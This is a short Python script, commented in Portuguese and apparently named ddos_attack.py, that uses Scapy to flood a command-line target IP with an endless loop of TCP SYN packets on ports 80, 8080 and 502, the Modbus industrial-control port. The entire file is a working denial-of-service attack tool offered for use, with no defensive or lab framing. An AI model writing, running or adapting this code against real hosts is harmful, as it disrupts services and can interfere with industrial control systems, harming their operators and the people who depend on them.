import os
import sys
import subprocess
import logging
import scapy
from scapy.all import *

#Logging
logging.getLogger("scapy.runtime").setLevel(logging.DEBUG)

# Configurações de ataque
MODBUS_PORT = 502

# Diretório para armazenar os logs
LOG_DIR = "/logs"
os.makedirs(LOG_DIR, exist_ok=True)

def run_ddos_attack(target):
    """Executa um ataque DDoS no alvo especificado e salva o log."""
    log_file = os.path.join(LOG_DIR, f"ddos_{target}.log")
    print(f"Executando ataque DDoS em {target}...")

    # Função simples de ataque DDoS com Scapy
    def flood(target_ip, log_file):
        packet = IP(dst=target_ip)/TCP(dport=[80, 8080, MODBUS_PORT], flags="S")
        send(packet, loop=1, verbose=0)
        with open(log_file, 'a') as f:
            f.write(f"Enviando pacotes para {target_ip}...\n")

    flood(target, log_file)

if __name__ == "__main__":
    print(f"Executando...")
    if len(sys.argv) != 2:
        print("Uso: python3 ddos_attack.py <TARGET_IP>")
        sys.exit(1)
    target_ip = sys.argv[1]
    print(f"Executando...")
    run_ddos_attack(target_ip)

